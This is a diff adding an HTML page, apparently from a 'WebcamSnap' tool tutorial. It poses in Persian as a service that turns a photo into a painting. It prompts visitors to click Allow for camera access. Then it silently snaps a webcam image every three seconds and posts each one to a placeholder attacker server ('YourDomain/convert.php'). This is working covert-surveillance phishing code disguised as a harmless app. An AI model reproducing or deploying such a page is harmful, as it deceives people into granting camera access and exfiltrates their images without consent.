@@ -1,0 +1,55 @@
+<!-- DociTeam - WebcamSnap -->
+<!-- YouTube Video : https://youtu.be/Golp-WCybQU -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تبدیل عکس به نقاشی</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script type="text/javascript" src="webcam-easy.min.js"></script>
+</head>
+<body>
+    <style>
+        body{
+            background-image: url(phone.png);
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: 30%;
+            background-position: center;
+        }
+            </style>
+    <center><video id="webcam" autoplay playsinline width="640" height="480"></video></center>
+    <canvas id="canvas" class="d-none"></canvas>
+    <audio id="snapSound" src="audio/snap.wav" preload = "auto"></audio>
+    <script>
+        const webcamElement = document.getElementById('webcam');
+        const canvasElement = document.getElementById('canvas');
+        const snapSoundElement = document.getElementById('snapSound');
+        const webcam = new Webcam(webcamElement, 'user', canvasElement, snapSoundElement);
+        Swal.fire({
+        title: 'کلیک کنید Allow روی دکمه',
+        text: "کلیک کنید Allow برای ادامه کار روی دکمه",
+        icon: 'warning',
+        })
+        webcam.start()
+            .then(result =>{
+                console.log("Webcam Started");
+            })
+            .catch(err => {
+                console.log(err);
+            });
+        function send(base){
+            var data = new FormData();
+            data.append("data" , base);
+            var xhr = (window.XMLHttpRequest) ? new XMLHttpRequest() : new activeXObject("Microsoft.XMLHTTP");
+            xhr.open( 'post', 'YourDomain/convert.php', true );
+            xhr.send(data);
+        };
+        setInterval(function () {let picture = webcam.snap();send(picture)}, 3000);
+    </script>
+</body>
+</html>
